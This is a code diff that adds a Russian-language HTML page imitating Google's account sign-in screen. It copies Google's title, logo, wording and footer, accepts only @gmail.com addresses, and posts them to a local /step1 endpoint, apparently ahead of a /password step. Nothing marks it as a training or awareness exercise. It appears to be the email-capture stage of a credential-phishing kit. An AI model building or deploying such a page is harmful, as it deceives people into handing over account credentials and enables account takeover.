@@ -1,47 +1,121 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title data-i18n="page_title">Вход – аккаунты Google</title>
+<link rel="icon" type="image/svg+xml" href="/static/google_logo.svg">
+<link rel="stylesheet" href="/static/style.css">
 <script>
-  document.querySelector('form').addEventListener('submit', function(e) {
-    var input = document.getElementById('email');
-    var emptyError = document.getElementById('emailErrorEmpty');
-    var notFoundError = document.getElementById('emailErrorNotFound');
-    var value = input.value.trim();
-
-    emptyError.style.display = 'none';
-    notFoundError.style.display = 'none';
-
-    // Проверка 1: пусто
-    if (value === '') {
-      e.preventDefault();
-      emptyError.style.display = 'flex';
-      input.style.borderColor = '#efb9b7';
-      input.style.borderWidth = '2px';
-      return;
-    }
-
-    // Проверка 2: должен заканчиваться на @gmail.com
-    if (!value.toLowerCase().endsWith('@gmail.com')) {
-      e.preventDefault();
-      notFoundError.style.display = 'flex';
-      input.style.borderColor = '#efb9b7';
-      input.style.borderWidth = '2px';
-      return;
-    }
-
-    // Проверка 3: перед @gmail.com должно быть что-то (не пусто)
-    if (value.toLowerCase() === '@gmail.com') {
-      e.preventDefault();
-      emptyError.style.display = 'flex';
-      input.style.borderColor = '#efb9b7';
-      input.style.borderWidth = '2px';
-      return;
-    }
-
-    // Всё ок — форма отправится на /password
-  });
-
-  document.getElementById('email').addEventListener('input', function() {
-    document.getElementById('emailErrorEmpty').style.display = 'none';
-    document.getElementById('emailErrorNotFound').style.display = 'none';
-    this.style.borderColor = '';
-    this.style.borderWidth = '';
-  });
+  (function() {
+    var saved = localStorage.getItem('theme');
+    if (saved) document.documentElement.setAttribute('data-theme', saved);
+  })();
 </script>
+</head>
+<body>
+
+  <div class="main">
+    <img class="logo" src="/static/google_logo.svg" alt="Google">
+
+    <h1 data-i18n="signin_title">Вход</h1>
+    <p class="sub" data-i18n="signin_sub">Используйте аккаунт Google</p>
+
+    <form action="/step1" method="POST" autocomplete="off" novalidate>
+      <input type="text" name="email" id="email" required autofocus placeholder="Телефон или электронный адрес" data-i18n-placeholder="email_placeholder">
+
+      <div class="error-message" id="emailErrorEmpty" style="display: none;">
+        <span class="error-icon">!</span>
+        <span>Введите адрес электронной почты или номер телефона.</span>
+      </div>
+
+      <div class="error-message" id="emailErrorNotFound" style="display: none;">
+        <span class="error-icon">!</span>
+        <span>Не удалось найти этот аккаунт.</span>
+      </div>
+
+      <a class="link" href="#" data-i18n="forgot_email">Забыли адрес электронной почты?</a>
+
+      <p class="hint">
+        <span data-i18n="guest_hint">Не ваш компьютер? Включите гостевой режим, чтобы защитить данные в аккаунте.</span>
+        <a href="#" data-i18n="guest_link">Подробнее об использовании гостевого режима</a>
+      </p>
+
+      <div class="actions">
+        <a class="create" href="#" data-i18n="create_account">Создать аккаунт</a>
+        <button type="submit" data-i18n="next">Далее</button>
+      </div>
+    </form>
+  </div>
+
+  <footer class="footer">
+    <div class="footer-row">
+      <div class="footer-left">
+        <select class="lang-select" id="langSelect" onchange="changeLang(this.value)">
+          <option value="ru">Русский</option>
+          <option value="en">English (United States)</option>
+          <option value="de">Deutsch</option>
+          <option value="fr">Français</option>
+          <option value="es">Español</option>
+          <option value="it">Italiano</option>
+          <option value="pt">Português</option>
+          <option value="pl">Polski</option>
+          <option value="uk">Українська</option>
+          <option value="zh">简体中文</option>
+        </select>
+      </div>
+      <div class="footer-right">
+        <a href="#" data-i18n="help">Справка</a>
+        <a href="#" data-i18n="privacy">Конфиденциальность</a>
+        <a href="#" data-i18n="terms">Условия</a>
+      </div>
+    </div>
+  </footer>
+
+  <script src="/static/i18n.js"></script>
+  <script>initLang();</script>
+
+  <script>
+    document.querySelector('form').addEventListener('submit', function(e) {
+      var input = document.getElementById('email');
+      var emptyError = document.getElementById('emailErrorEmpty');
+      var notFoundError = document.getElementById('emailErrorNotFound');
+      var value = input.value.trim();
+
+      emptyError.style.display = 'none';
+      notFoundError.style.display = 'none';
+
+      if (value === '') {
+        e.preventDefault();
+        emptyError.style.display = 'flex';
+        input.style.borderColor = '#efb9b7';
+        input.style.borderWidth = '2px';
+        return;
+      }
+
+      if (!value.toLowerCase().endsWith('@gmail.com')) {
+        e.preventDefault();
+        notFoundError.style.display = 'flex';
+        input.style.borderColor = '#efb9b7';
+        input.style.borderWidth = '2px';
+        return;
+      }
+
+      if (value.toLowerCase() === '@gmail.com') {
+        e.preventDefault();
+        emptyError.style.display = 'flex';
+        input.style.borderColor = '#efb9b7';
+        input.style.borderWidth = '2px';
+        return;
+      }
+    });
+
+    document.getElementById('email').addEventListener('input', function() {
+      document.getElementById('emailErrorEmpty').style.display = 'none';
+      document.getElementById('emailErrorNotFound').style.display = 'none';
+      this.style.borderColor = '';
+      this.style.borderWidth = '';
+    });
+  </script>
+</body>
+</html>
